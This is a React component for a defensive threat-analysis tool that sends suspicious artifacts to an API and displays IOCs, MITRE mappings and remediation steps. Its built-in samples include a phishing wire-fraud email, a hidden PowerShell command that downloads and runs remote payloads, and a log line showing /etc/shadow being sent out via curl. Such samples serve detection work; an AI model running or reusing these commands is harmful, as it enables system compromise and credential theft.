import { useState, type FormEvent } from 'react';
import {
  CheckCircle2,
  Copy,
  FileDown,
  Loader2,
  Radar,
  ShieldAlert,
  Trash2,
} from 'lucide-react';
import type { ThreatAnalysisResult, UserProfile } from '../types/security';
import { downloadThreatAnalysisPdf } from '../utils/pdfReport';
import { SeverityIndicator, getProgressBarClass, getScoreAccentClass } from './SeverityIndicator';

interface ThreatAnalyzerProps {
  analyses: ThreatAnalysisResult[];
  analyst: UserProfile | null;
  onAnalysisComplete: (result: ThreatAnalysisResult) => void;
  onClearHistory: () => void;
}

const CONTEXT_TYPES = [
  'Phishing Email',
  'Smishing SMS',
  'Shell / Script',
  'Server / Auth Log',
  'IOC / General',
];

const SAMPLE_ARTIFACTS = [
  {
    label: 'BEC Wire Email',
    context: 'Phishing Email',
    text: `From: CFO Urgent <ceo-office@corp-payments-verify.xyz>
Subject: Immediate Vendor Wire Transfer Required Today

Hi Finance Team,
I am in a board meeting and cannot take calls. Please process an urgent $48,500 wire transfer to our new audit partner at http://185.220.101.44/invoice-portal/confirm before 3:00 PM. Reply only to this address with the confirmation PDF.`,
  },
  {
    label: 'PowerShell Dropper',
    context: 'Shell / Script',
    text: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://cdn-update-helper.top/payload.ps1'); Invoke-WebRequest -Uri http://45.142.212.90/stage2.exe -OutFile $env:TEMP\\svchost_upd.exe"`,
  },
  {
    label: 'SSH Brute-Force Log',
    context: 'Server / Auth Log',
    text: `Nov 21 04:12:08 prod-edge-02 sshd[19482]: Failed password for invalid user admin from 193.32.162.159 port 51842 ssh2
Nov 21 04:12:11 prod-edge-02 sshd[19485]: Failed password for root from 193.32.162.159 port 51910 ssh2
Nov 21 04:12:14 prod-edge-02 sshd[19489]: Accepted publickey for deploy from 193.32.162.159 port 52001 ssh2
Nov 21 04:13:02 prod-edge-02 curl: outbound connection to https://transfer.sh/a8f92/etc-shadow.tar.gz`,
  },
];

export function ThreatAnalyzer({
  analyses,
  analyst,
  onAnalysisComplete,
  onClearHistory,
}: ThreatAnalyzerProps) {
  const [contextType, setContextType] = useState('Phishing Email');
  const [artifact, setArtifact] = useState('');
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [activeReport, setActiveReport] = useState<ThreatAnalysisResult | null>(analyses[0] || null);
  const [copiedIoc, setCopiedIoc] = useState<string | null>(null);

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!artifact.trim()) return;

    setIsAnalyzing(true);
    setError(null);

    try {
      const response = await fetch('/api/analyze-threat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ artifact: artifact.trim(), contextType }),
      });

      const data = await response.json();
      if (!response.ok) {
        setError(data.error || `Threat analysis failed with status ${response.status}.`);
        return;
      }

      const result = data as ThreatAnalysisResult;
      setActiveReport(result);
      onAnalysisComplete(result);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Network error running threat analysis.');
    } finally {
      setIsAnalyzing(false);
    }
  };

  const handleCopyIoc = async (val: string) => {
    try {
      await navigator.clipboard.writeText(val);
      setCopiedIoc(val);
      setTimeout(() => setCopiedIoc(null), 1500);
    } catch {
      // Clipboard blocked
    }
  };

  return (
    <div className="space-y-6">
      <section className="neon-panel rounded-2xl p-5 sm:p-6 space-y-4">
        <div>
          <h1 className="text-xl sm:text-2xl font-bold text-slate-900 dark:text-slate-50">
            Cyber Threat Analyzer
          </h1>
          <p className="text-xs sm:text-sm text-slate-600 dark:text-slate-400 mt-1">
            Submit suspicious emails, SMS lures, shell commands, server logs, or IOCs for automated extraction, MITRE ATT&amp;CK mapping, and containment guidance.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="flex flex-wrap gap-2">
            {CONTEXT_TYPES.map((type) => (
              <button
                key={type}
                type="button"
                onClick={() => setContextType(type)}
                className={`min-h-[38px] px-3.5 py-1.5 rounded-lg text-xs font-medium transition-colors cursor-pointer whitespace-nowrap ${
                  contextType === type
                    ? 'bg-sky-600 text-white'
                    : 'bg-slate-100 dark:bg-slate-900 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-800 hover:border-sky-400 dark:hover:border-sky-500/35'
                }`}
              >
                {type}
              </button>
            ))}
          </div>

          <textarea
            rows={6}
            value={artifact}
            onChange={(e) => setArtifact(e.target.value)}
            placeholder="Paste suspicious email text, command line, firewall log, IP, hash, or CVE..."
            aria-label="Suspicious artifact text"
            className="w-full p-4 rounded-xl bg-slate-50 dark:bg-slate-950/90 border border-slate-300 dark:border-sky-500/25 text-xs sm:text-sm font-mono text-slate-900 dark:text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-sky-500 dark:focus:border-sky-400 focus:ring-2 focus:ring-sky-500/25 resize-y"
          />

          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div className="flex flex-wrap items-center gap-2">
              <span className="text-xs text-slate-600 dark:text-slate-400">Load sample:</span>
              {SAMPLE_ARTIFACTS.map((sample) => (
                <button
                  key={sample.label}
                  type="button"
                  onClick={() => {
                    setContextType(sample.context);
                    setArtifact(sample.text);
                  }}
                  className="min-h-[36px] px-3 py-1 rounded-lg bg-slate-100 dark:bg-slate-900 hover:bg-slate-200 dark:hover:bg-slate-800 border border-slate-200 dark:border-slate-800 text-xs text-sky-700 dark:text-sky-300 cursor-pointer"
                >
                  {sample.label}
                </button>
              ))}
            </div>

            <button
              type="submit"
              disabled={isAnalyzing || artifact.trim().length < 6}
              className="neon-btn-primary min-h-[46px] px-6 py-2.5 rounded-xl text-sm font-semibold text-white whitespace-nowrap shrink-0 inline-flex items-center justify-center gap-2 transition-all disabled:opacity-45 disabled:cursor-not-allowed cursor-pointer"
            >
              {isAnalyzing ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" aria-hidden="true" />
                  <span>Analyzing Threat...</span>
                </>
              ) : (
                <>
                  <Radar className="w-4 h-4" aria-hidden="true" />
                  <span>Run Threat Analysis</span>
                </>
              )}
            </button>
          </div>
        </form>

        {error && (
          <div
            role="alert"
            className="p-4 rounded-xl bg-rose-50 dark:bg-rose-950/40 border border-rose-200 dark:border-rose-500/35 text-sm text-rose-800 dark:text-rose-200 flex items-start gap-3"
          >
            <ShieldAlert className="w-5 h-5 text-rose-600 dark:text-rose-400 shrink-0 mt-0.5" aria-hidden="true" />
            <div>
              <p className="font-semibold text-rose-700 dark:text-rose-300">Analysis Error</p>
              <p className="text-xs text-rose-700 dark:text-rose-200/90 mt-1">{error}</p>
            </div>
          </div>
        )}
      </section>

      {isAnalyzing && (
        <section className="neon-panel rounded-2xl p-6 space-y-4 animate-pulse" aria-busy="true">
          <div className="h-5 w-48 bg-slate-200 dark:bg-slate-800 rounded" />
          <div className="h-3 w-full bg-slate-200 dark:bg-slate-800 rounded" />
          <div className="h-28 w-full bg-slate-100 dark:bg-slate-900 rounded-xl" />
        </section>
      )}

      {!isAnalyzing && activeReport && (
        <section className="neon-panel neon-panel-active rounded-2xl p-5 sm:p-6 space-y-6">
          <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-4">
            <div className="space-y-1.5 min-w-0">
              <div className="flex flex-wrap items-center gap-2 text-xs text-slate-600 dark:text-slate-400">
                <SeverityIndicator level={activeReport.severity} />
                <span aria-hidden="true">·</span>
                <span>{activeReport.threatCategory}</span>
                <span aria-hidden="true">·</span>
                <span>{activeReport.attackVector}</span>
              </div>
              <h2 className="text-lg font-bold text-slate-900 dark:text-slate-50">
                Threat Intelligence Report
              </h2>
              <p className="text-sm text-slate-700 dark:text-slate-300 leading-relaxed">{activeReport.summary}</p>
            </div>

            <div className="shrink-0 flex sm:flex-col items-center sm:items-end justify-between gap-3">
              <div className="sm:text-right">
                <p className="text-xs text-slate-500 dark:text-slate-400">Severity Score</p>
                <p className={`text-3xl font-bold font-mono tabular-nums ${getScoreAccentClass(activeReport.riskScore)}`}>
                  {activeReport.riskScore}
                  <span className="text-sm text-slate-500 font-normal">/100</span>
                </p>
              </div>
              <button
                type="button"
                onClick={() => downloadThreatAnalysisPdf(activeReport, analyst)}
                className="min-h-[40px] px-3.5 py-2 rounded-xl bg-sky-600 hover:bg-sky-500 text-xs font-semibold text-white inline-flex items-center gap-1.5 whitespace-nowrap cursor-pointer"
              >
                <FileDown className="w-4 h-4" aria-hidden="true" />
                <span>Download PDF</span>
              </button>
            </div>
          </div>

          <div className="h-2 w-full rounded-full bg-slate-200 dark:bg-slate-900 overflow-hidden">
            <div
              className={`h-full transition-all ${getProgressBarClass(activeReport.riskScore)}`}
              style={{ width: `${activeReport.riskScore}%` }}
            />
          </div>

          {/* Extracted Indicators of Compromise */}
          <div className="pt-3 border-t border-slate-200 dark:border-slate-800/80 space-y-3">
            <h3 className="text-sm font-semibold text-slate-900 dark:text-slate-100">
              Extracted Indicators of Compromise (IOCs)
            </h3>
            {activeReport.indicators.length === 0 ? (
              <p className="text-xs text-slate-500 dark:text-slate-400">
                No discrete network or file indicators extracted.
              </p>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse text-xs">
                  <thead>
                    <tr className="border-b border-slate-200 dark:border-slate-800 text-slate-600 dark:text-slate-400">
                      <th className="py-2 pr-4 font-medium">Indicator</th>
                      <th className="py-2 pr-4 font-medium">Type</th>
                      <th className="py-2 pr-4 font-medium">Risk</th>
                      <th className="py-2 pr-4 font-medium">Assessment</th>
                      <th className="py-2 text-right font-medium">Copy</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-200 dark:divide-slate-800/60">
                    {activeReport.indicators.map((ioc, idx) => (
                      <tr key={idx}>
                        <td className="py-2.5 pr-4 font-mono text-slate-900 dark:text-slate-100 break-all max-w-[220px]">
                          {ioc.value}
                        </td>
                        <td className="py-2.5 pr-4 text-slate-700 dark:text-slate-300 whitespace-nowrap">{ioc.type}</td>
                        <td className="py-2.5 pr-4 whitespace-nowrap">
                          <span
                            className={
                              ioc.riskLevel === 'Malicious'
                                ? 'text-rose-600 dark:text-rose-400 font-semibold'
                                : ioc.riskLevel === 'Suspicious'
                                  ? 'text-amber-600 dark:text-amber-400 font-semibold'
                                  : 'text-sky-600 dark:text-sky-400'
                            }
                          >
                            {ioc.riskLevel}
                          </span>
                        </td>
                        <td className="py-2.5 pr-4 text-slate-700 dark:text-slate-300 min-w-[180px]">{ioc.note}</td>
                        <td className="py-2.5 text-right">
                          <button
                            type="button"
                            onClick={() => void handleCopyIoc(ioc.value)}
                            className="min-h-[32px] min-w-[32px] inline-flex items-center justify-center rounded-md hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-100 cursor-pointer"
                            aria-label={`Copy ${ioc.value}`}
                          >
                            <Copy className="w-3.5 h-3.5" aria-hidden="true" />
                          </button>
                          {copiedIoc === ioc.value && (
                            <span className="ml-1 text-[11px] text-emerald-600 dark:text-emerald-400">Copied</span>
                          )}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>

          {/* MITRE ATT&CK & Remediation Playbook */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-3 border-t border-slate-200 dark:border-slate-800/80">
            <div>
              <h3 className="text-sm font-semibold text-slate-900 dark:text-slate-100 mb-3">
                MITRE ATT&amp;CK Mapping
              </h3>
              {activeReport.mitreTechniques.length === 0 ? (
                <p className="text-xs text-slate-500 dark:text-slate-400">No adversarial techniques mapped.</p>
              ) : (
                <ul className="space-y-2">
                  {activeReport.mitreTechniques.map((tech, idx) => (
                    <li
                      key={idx}
                      className="p-3 rounded-xl bg-slate-50 dark:bg-slate-950/70 border border-slate-200 dark:border-slate-800/80 flex items-center justify-between gap-3 text-xs"
                    >
                      <div className="min-w-0">
                        <p className="font-semibold text-slate-900 dark:text-slate-100 truncate">{tech.name}</p>
                        <p className="text-slate-600 dark:text-slate-400 mt-0.5">{tech.tactic}</p>
                      </div>
                      <span className="font-mono text-sky-600 dark:text-sky-400 shrink-0">{tech.id}</span>
                    </li>
                  ))}
                </ul>
              )}
            </div>

            <div>
              <h3 className="text-sm font-semibold text-slate-900 dark:text-slate-100 mb-3">
                Containment &amp; Remediation
              </h3>
              <ul className="space-y-2.5 text-xs sm:text-sm text-slate-700 dark:text-slate-300">
                {activeReport.remediationSteps.map((step, idx) => (
                  <li key={idx} className="flex items-start gap-2.5">
                    <CheckCircle2 className="w-4 h-4 text-sky-600 dark:text-sky-400 shrink-0 mt-0.5" aria-hidden="true" />
                    <span>{step}</span>
                  </li>
                ))}
              </ul>
            </div>
          </div>
        </section>
      )}

      {/* History */}
      {analyses.length > 0 && (
        <section className="neon-panel rounded-2xl p-5 sm:p-6">
          <div className="flex items-center justify-between gap-4 mb-3">
            <h3 className="text-base font-semibold text-slate-900 dark:text-slate-100">
              Previous Threat Reports
            </h3>
            <button
              type="button"
              onClick={() => {
                onClearHistory();
                setActiveReport(null);
              }}
              className="inline-flex items-center gap-1.5 text-xs text-slate-600 dark:text-slate-400 hover:text-rose-600 dark:hover:text-rose-400 cursor-pointer"
            >
              <Trash2 className="w-3.5 h-3.5" aria-hidden="true" />
              <span>Clear</span>
            </button>
          </div>
          <div className="divide-y divide-slate-200 dark:divide-slate-800/80">
            {analyses.map((item) => (
              <div key={item.id} className="py-3 flex items-center justify-between gap-3">
                <button
                  type="button"
                  onClick={() => setActiveReport(item)}
                  className="flex-1 min-w-0 flex items-center justify-between gap-4 text-left hover:bg-sky-500/5 px-2 py-1 -mx-2 rounded-lg transition-colors cursor-pointer"
                >
                  <div className="min-w-0">
                    <p className="text-xs sm:text-sm font-medium text-slate-900 dark:text-slate-100 truncate">
                      {item.threatCategory} · {item.contextType}
                    </p>
                    <p className="text-xs text-slate-500 dark:text-slate-400 font-mono truncate mt-0.5">
                      {item.inputPreview}
                    </p>
                  </div>
                  <div className="shrink-0 text-right">
                    <SeverityIndicator level={item.severity} />
                    <p className="text-xs font-mono tabular-nums text-slate-500 dark:text-slate-400 mt-0.5">
                      {item.riskScore}/100
                    </p>
                  </div>
                </button>
                <button
                  type="button"
                  onClick={() => downloadThreatAnalysisPdf(item, analyst)}
                  aria-label="Download PDF threat report"
                  className="min-h-[38px] min-w-[38px] flex items-center justify-center rounded-lg bg-slate-100 dark:bg-slate-900 hover:bg-sky-50 dark:hover:bg-slate-800 border border-slate-200 dark:border-slate-800 text-sky-700 dark:text-sky-300 shrink-0 cursor-pointer"
                >
                  <FileDown className="w-4 h-4" aria-hidden="true" />
                </button>
              </div>
            ))}
          </div>
        </section>
      )}
    </div>
  );
}
